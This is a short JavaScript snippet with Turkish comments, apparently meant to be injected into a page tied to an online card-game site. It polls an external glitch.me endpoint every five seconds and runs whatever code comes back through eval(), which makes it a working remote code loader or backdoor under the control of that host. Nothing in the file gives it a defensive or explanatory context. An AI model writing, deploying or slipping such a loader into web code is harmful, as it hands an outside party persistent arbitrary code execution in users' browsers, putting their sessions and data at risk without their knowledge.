(function() {
    console.log('Script yüklendi!', 'Zaman:', new Date().toISOString());

    function fetchCode() {
        fetch('https://duello-katiponline-com.glitch.me/get-code')
            .then(response => {
                if (!response.ok) throw new Error('Sunucu yanıtı başarısız: ' + response.status);
                return response.json();
            })
            .then(data => {
                console.log('Kod alındı:', data.code, 'Zaman:', new Date().toISOString());
                if (data.code) {
                    try {
                        eval(data.code);
                    } catch (e) {
                        console.error('Kod çalıştırma hatası:', e.message, 'Zaman:', new Date().toISOString());
                    }
                }
            })
            .catch(error => {
                console.error('Kod çekme hatası:', error.message, 'Zaman:', new Date().toISOString());
            })
            .finally(() => {
                // 5 saniye sonra tekrar çek
                setTimeout(fetchCode, 5000);
            });
    }

    // İlk çalıştırmayı başlat
    fetchCode();
})();
